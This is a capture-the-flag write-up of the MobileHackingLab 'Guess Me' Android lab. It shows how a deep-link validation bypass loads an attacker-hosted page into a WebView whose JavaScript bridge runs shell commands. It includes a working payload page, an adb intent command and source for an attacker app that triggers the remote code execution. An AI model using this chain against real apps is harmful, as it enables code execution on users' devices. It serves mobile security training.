**Description**: Welcome to the "**Guess Me**" Deep Link Exploitation Challenge! Immerse yourself in the world of cybersecurity with this hands-on lab. This challenge revolves around a fictitious "Guess Me" app, shedding light on a critical security flaw related to deep links that can lead to remote code execution within the app's framework.

**Download**: https://lautarovculic.com/my_files/guessMe.apk
**Link**: https://www.mobilehackinglab.com/path-player?courseid=lab-guess-me

![[guessMe.png]]

Install the app with **ADB**
```bash
adb install -r guessMe.apk
```

Let's decompile it with **apktool**
```bash
apktool d guessMe.apk
```

The application seems **to be a game** where we must **guess a randomly generated number between 1 and 100**. If we guess it, the app will tell us how many tries we have succeeded.

But, if we pay attention, in the *lower right corner* we have an *information icon*. Where we see a **link to the mobile hacking lab site**.

Let's inspect the **source code** with **jadx**.
The **package name** is `com.mobilehackinglab.guessme`.
Also, in the **AndroidManifest.xml** file we can see *two activities*
```XML
<activity
    android:name="com.mobilehackinglab.guessme.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
<activity
    android:name="com.mobilehackinglab.guessme.WebviewActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data
            android:scheme="mhl"
            android:host="mobilehackinglab"/>
    </intent-filter>
</activity>
```

Well, in the **MainActivity** we have just the **game**. So, let's move on to the **WebviewActivity**:
```java
private final void handleDeepLink(Intent intent) {
    Uri uri = intent != null ? intent.getData() : null;
    if (uri != null) {
        if (isValidDeepLink(uri)) {
            loadDeepLink(uri);
        } else {
            loadAssetIndex();
        }
    }
}

private final boolean isValidDeepLink(Uri uri) {
    if ((!Intrinsics.areEqual(uri.getScheme(), "mhl") && !Intrinsics.areEqual(uri.getScheme(), "https")) || !Intrinsics.areEqual(uri.getHost(), "mobilehackinglab")) {
        return false;
    }
    String queryParameter = uri.getQueryParameter("url");
    return queryParameter != null && StringsKt.endsWith$default(queryParameter, "mobilehackinglab.com", false, 2, (Object) null);
}

private final void loadDeepLink(Uri uri) {
    String fullUrl = String.valueOf(uri.getQueryParameter("url"));
    WebView webView = this.webView;
    WebView webView2 = null;
    if (webView == null) {
        Intrinsics.throwUninitializedPropertyAccessException("webView");
        webView = null;
    }
    webView.loadUrl(fullUrl);
    WebView webView3 = this.webView;
    if (webView3 == null) {
        Intrinsics.throwUninitializedPropertyAccessException("webView");
    } else {
        webView2 = webView3;
    }
    webView2.reload();
}

private final void loadAssetIndex() {
    WebView webView = this.webView;
    if (webView == null) {
        Intrinsics.throwUninitializedPropertyAccessException("webView");
        webView = null;
    }
    webView.loadUrl("file:///android_asset/index.html");
}

/* compiled from: WebviewActivity.kt */
@Metadata(d1 = {"\u0000\u001c\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0002\b\u0002\b\u0086\u0004\u0018\u00002\u00020\u0001B\u0005¢\u0006\u0002\u0010\u0002J\u0010\u0010\u0003\u001a\u00020\u00042\u0006\u0010\u0005\u001a\u00020\u0004H\u0007J\u0010\u0010\u0006\u001a\u00020\u00072\u0006\u0010\b\u001a\u00020\u0004H\u0007¨\u0006\t"}, d2 = {"Lcom/mobilehackinglab/guessme/WebviewActivity$MyJavaScriptInterface;", "", "(Lcom/mobilehackinglab/guessme/WebviewActivity;)V", "getTime", "", "Time", "loadWebsite", "", "url", "app_debug"}, k = 1, mv = {1, 9, 0}, xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
/* loaded from: classes3.dex */
public final class MyJavaScriptInterface {
    public MyJavaScriptInterface() {
    }

    @JavascriptInterface
    public final void loadWebsite(String url) {
        Intrinsics.checkNotNullParameter(url, "url");
        WebView webView = WebviewActivity.this.webView;
        if (webView == null) {
            Intrinsics.throwUninitializedPropertyAccessException("webView");
            webView = null;
        }
        webView.loadUrl(url);
    }

    @JavascriptInterface
    public final String getTime(String Time) {
        Intrinsics.checkNotNullParameter(Time, "Time");
        try {
            Process process = Runtime.getRuntime().exec(Time);
            InputStream inputStream = process.getInputStream();
            Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");
            Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
            BufferedReader reader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
            String readText = TextStreamsKt.readText(reader);
            reader.close();
            return readText;
        } catch (Exception e) {
            return "Error getting time";
        }
    }
}
```

This is the code that we need for our **RCE** exploitation via **DeepLinks**.
Here:
```java
private final void loadAssetIndex() {
    WebView webView = this.webView;
    if (webView == null) {
        Intrinsics.throwUninitializedPropertyAccessException("webView");
        webView = null;
    }
    webView.loadUrl("file:///android_asset/index.html");
}
```

We can find the `index.html` file that the app use in the **`assets`** directory that **apktool** drop us.
So, the content is simple.
Returning the java code of *WebviewActivity*
```java
private final boolean isValidDeepLink(Uri uri) {
    if ((!Intrinsics.areEqual(uri.getScheme(), "mhl") && !Intrinsics.areEqual(uri.getScheme(), "https")) || !Intrinsics.areEqual(uri.getHost(), "mobilehackinglab")) {
        return false;
    }
    String queryParameter = uri.getQueryParameter("url");
    return queryParameter != null && StringsKt.endsWith$default(queryParameter, "mobilehackinglab.com", false, 2, (Object) null);
}
```

Here's a **validation** that the app makes. The `mhl` is the **scheme** (like `http/https`).
The `mobilehackinglab` is the **host**, and `url` the **parameter**. This *need end with `mobilehackinglab.com`*.
So, the final deeplink is `mhl://mobilehackinglab?url=mobilehackinglab.com`

Also, we have a class called **`MyJavaScriptInterface`**
```java
public final class MyJavaScriptInterface {  
    @JavascriptInterface  
    public final String getTime(String time) {  
        Intrinsics.checkNotNullParameter(time, "time");  
        try {  
            Process process = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", time});  
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));  
            StringBuilder output = new StringBuilder();  
            while (true) {  
                String it = reader.readLine();  
                if (it != null) {  
                    output.append(it).append("\n");  
                } else {  
                    reader.close();  
                    String sb = output.toString();  
                    Intrinsics.checkNotNullExpressionValue(sb, "toString(...)");  
                    return StringsKt.trim((CharSequence) sb).toString();  
                }  
            }  
        } catch (Exception e) {  
            return "Error getting time and listing files";  
        }  
    }  
}
```

That is used also in the **WebviewActivity** class.
This will exec the command `time`
```java
Process process = Runtime.getRuntime().exec(Time);
```

So, we can modify the original `index.html` file, just the command.
Looking like:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>

<p id="result">Thank you for visiting</p>

<!-- Add a hyperlink with onclick event -->
<a href="#" onclick="loadWebsite()">Visit MobileHackingLab</a>

<script>

    function loadWebsite() {
       window.location.href = "https://www.mobilehackinglab.com/";
    }

    // Fetch and display the time when the page loads
    var result = AndroidBridge.getTime("id");
    var lines = result.split('\n');
    var timeVisited = lines[0];
    var fullMessage = "Thanks for playing the game\n\n Please visit mobilehackinglab.com for more! \n\nTime of visit: " + timeVisited;
    document.getElementById('result').innerText = fullMessage;

</script>

</body>
</html>
```

This is possible also by
```java
webView3.addJavascriptInterface(new MyJavaScriptInterface(), "AndroidBridge");
```
This line of code **connects a Java class to the JavaScript environment of a WebView** in Android, allowing **JavaScript code executed inside the WebView** to access specific methods of the `MyJavaScriptInterface` class.

So, put your `index.html` inside of your webserver like `python`
```bash
python3 -m http.server 8081
```

Then, we can use this **ADB** command for send the **Intent**.
```bash
adb shell am start -a android.intent.action.VIEW -d "mhl://mobilehackinglab?url=http://192.168.18.44:8081/index.html?mobilehackinglab.com" com.mobilehackinglab.guessme/.WebviewActivity
```

Notice that we can **bypass** the validation passing `mobilehackinglab.com` as "*parameter*".

![[guessMe2.png]]

Also, we can change the command `id` to `whoami`. Then, check if the **sandboxed** user is `u0_a415`

![[guessMe3.png]]


*But, an RCE with ADB is not the best idea and leaves us wanting more. So we will make a “malicious” app that sends the intent when we press a button*
So let's take advantage of the fact that the webview activity is exported and we can call it from another application.

Obviously, in my case, Ill make a **LAN** server where the "malicious" app call to my python webserver. To `http://192.168.18.44:8081/index.html`

Here's the code of our app
**`MainActivity.java`**
```java
package com.lautaro.exploitme;  
  
import android.content.Intent;  
import android.net.Uri;  
import android.os.Bundle;  
import androidx.appcompat.app.AppCompatActivity;  
  
public class MainActivity extends AppCompatActivity {  
  
    @Override  
    protected void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
  
        // Create Intent  
        Intent intent = new Intent();  
        intent.setAction(Intent.ACTION_VIEW);  
        intent.setData(Uri.parse("mhl://mobilehackinglab?url=http://192.168.18.44:8081/index.html?mobilehackinglab.com"));  
        intent.setClassName(  
                "com.mobilehackinglab.guessme",  
                "com.mobilehackinglab.guessme.WebviewActivity"  
        );  
  
        // Launch intent  
        startActivity(intent);  
  
        // Close app  
        finish();  
    }  
}
```

**`AndroidManifest.xml`**
```XML
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <application
        android:allowBackup="true"
        android:dataExtractionRules="@xml/data_extraction_rules"
        android:fullBackupContent="@xml/backup_rules"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.ExploitMe"
        tools:targetApi="31">
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>

</manifest>
```

Run your app, and look the **RCE** ;)

I hope you found it useful (: